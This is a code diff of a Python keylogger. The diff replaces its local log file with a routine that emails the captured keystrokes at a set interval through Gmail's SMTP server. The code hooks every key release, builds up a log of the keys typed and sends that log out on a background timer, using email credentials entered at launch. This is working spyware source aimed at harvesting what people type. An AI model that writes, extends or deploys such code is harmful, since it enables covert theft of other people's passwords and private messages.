@@ -1,17 +1,22 @@
-import keyboard, os
-from threading import Semaphore, Timer
+import keyboard, os, smtplib, getpass
+from threading import Timer
 
 
-class Keylogger():
-  def __init__(self,arg1):
-    #reads inputs
+# get email address and password
+EMAIL_ADDRESS = input("Email Address: ")
+EMAIL_PASSWORD = getpass.getpass("Email Password: ")
+
+
+class Keylogger:
+  def __init__(self, interval):
+    # initialize interval
+    self.interval = interval
+
+    # record keylogs
     self.log = ""
-    #write out object 
-    self.out = open(arg1,"a")
-    #block current thread
-    self.Semaphore = Semaphore(0)
 
   def callback(self,event):
+    # callback is invoked whenever a keyboard event is occurred
     name = event.name
 
     if len(name) > 1:
@@ -22,7 +27,6 @@ class Keylogger():
       elif name == "decimal":
         name = "."
       elif name == "esc":
-        self.out.close()
         os._exit(1)
       else:
         name = name.replace(" ", "_")
@@ -30,14 +34,31 @@ class Keylogger():
 
     self.log += name
 
+  def sendmail(self,email,password,message):
+    # setup SMTP connection
+    server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+    server.starttls()
+
+    # login and password,then send send mail
+    server.login(email,password)
+    server.sendmail(email,email,message)
+    server.quit()
+
   def report(self):
+    # send keylogs 
     if self.log:
-      self.out.write(self.log)
+      self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+
+    # reset self.log variable
     self.log = ""
-    Timer(interval=1.0,function=self.report).start()
+
+    # die when main thread die
+    timer = Timer(interval=self.interval, function=self.report)
+    timer.daemon = True
+    timer.start()
 
   def start(self):
+    # run on startup
     keyboard.on_release(callback=self.callback)
     self.report()
-    self.Semaphore.acquire()
-
+    keyboard.wait()
